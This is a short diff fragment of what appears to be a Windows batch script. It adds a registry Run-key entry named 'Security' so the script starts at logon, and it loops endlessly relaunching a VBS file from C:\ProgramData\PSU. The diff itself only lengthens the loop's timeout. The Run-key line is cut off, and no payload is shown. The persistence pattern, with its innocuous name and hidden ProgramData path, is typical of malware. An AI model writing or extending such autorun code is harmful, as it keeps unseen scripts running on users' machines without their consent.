@@ -8,5 +8,5 @@ REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t RE
 goto start
 :execute
 start "" "C:\ProgramData\PSU\execute.vbs"
-timeout 1
+timeout 2
 goto start
